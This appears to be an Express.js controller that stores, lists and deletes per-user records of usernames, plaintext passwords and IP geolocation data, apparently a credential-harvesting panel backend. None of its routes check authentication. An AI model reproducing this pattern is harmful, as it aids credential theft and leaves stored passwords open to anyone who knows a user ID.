let User = require("../models/userModel.js");
exports.addToDetails = async (req, res) => {
  const {
    userId,
    password,
    ip,
    city,
    country,
    loc,
    org,
    date,
    username,
    region,
    timezone,
  } = req.body;

  // Check if the user exists.
  const user = await User.findById(userId);
  if (!user) {
    res.status(404).json({ error: "User not found" });
    return;
  }

  // Add the new detail to the user's list of details.
  user.details.push({
    username,
    password,
    ip,
    country,
    city,
    loc,
    date,
    org,
    region,
    timezone,
  });
  await user.save();

  // Return the user object.
  res.json(user);
};

exports.getDetails = async (req, res) => {
  const userId = req.query.userId;
  console.log(req.query.userId);
  // Check if the user exists.
  const user = await User.findById(userId);
  if (!user) {
    res.status(404).json({ error: "User not found" });
    return;
  }

  // Return the user's details.
  res.json(user.details);
};
exports.deleteDetail = async (req, res) => {
  const userId = req.body.userId;
  const detailIndex = req.query.index;
  // Check if the user exists.
  const user = await User.findById(userId);
  if (!user) {
    res.status(404).json({ error: "User not found" });
    return;
  }

  // Delete and return the user's details
  if (detailIndex !== -1) {
    user.details.splice(detailIndex, 1);
    await user.save();
    res.json(user.details);
  }
};
